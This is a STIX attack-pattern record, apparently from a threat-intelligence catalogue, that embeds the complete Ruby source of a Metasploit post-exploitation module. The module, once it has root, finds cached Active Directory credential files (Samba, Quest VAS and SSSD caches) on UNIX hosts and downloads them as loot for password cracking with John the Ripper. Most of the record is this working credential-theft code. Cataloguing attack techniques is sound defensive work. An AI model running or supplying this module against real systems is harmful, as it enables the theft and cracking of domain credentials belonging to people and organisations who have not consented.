{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4009de85-13a1-461c-b39c-5e8446bb328d",
    "created": "2024-08-14T16:33:19.18422Z",
    "modified": "2024-08-14T16:33:19.184224Z",
    "name": "UNIX Gather Cached AD Hashes",
    "description": "Post Module to obtain all cached AD hashes on the targeted UNIX machine. These can be cracked with John the Ripper (JtR). 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/unix_cached_ad_hashes.rb",
            "external_id": "unix_cached_ad_hashes.rb"
        }
    ],
    "x_code_snippet": "# Copyright (c) 2015-2018, Cisco International Ltd\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#     * Redistributions of source code must retain the above copyright\n#       notice, this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above copyright\n#       notice, this list of conditions and the following disclaimer in the\n#       documentation and/or other materials provided with the distribution.\n#     * Neither the name of the Cisco International Ltd nor the\n#       names of its contributors may be used to endorse or promote products\n#       derived from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY\n# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Post::Common\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather Cached AD Hashes',\n        'Description' => %q{ Post Module to obtain all cached AD hashes on the targeted UNIX machine. These can be cracked with John the Ripper (JtR). },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Tim Brown <timb[at]nth-dimension.org.uk>'],\n        'Platform' => %w[linux osx unix solaris aix],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def run\n    fail_with(Msf::Module::Failure::NoAccess, 'Must be running as root') unless is_root?\n    print_status('Finding files')\n    files = [ '/var/lib/samba/private/secrets.tdb', '/var/lib/samba/passdb.tdb', '/var/opt/quest/vas/authcache/vas_auth.vdb' ]\n    files += cmd_exec('ls /var/lib/sss/db/cache_*').split(/\\r\\n|\\r|\\n/)\n    files = files.select { |d| file?(d) }\n    if files.nil? || files.empty?\n      print_error('No cached AD hashes found')\n      return\n    end\n    download_loot(files)\n  end\n\n  def download_loot(files)\n    print_status(\"Looting #{files.count} files\")\n    files.each do |file|\n      file.chomp!\n      sep = '/'\n      print_status(\"Downloading #{file}\")\n      data = read_file(file)\n      file = file.split(sep).last\n      loot_file = store_loot('unix_cached_ad_hashes', 'application/vnd.sqlite3', session, data, \"unix_cached_ad_hashes_#{file}\", 'Cached AD Hashes File')\n      print_good(\"File stored in: #{loot_file}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux osx unix solaris aix]"
    ]
}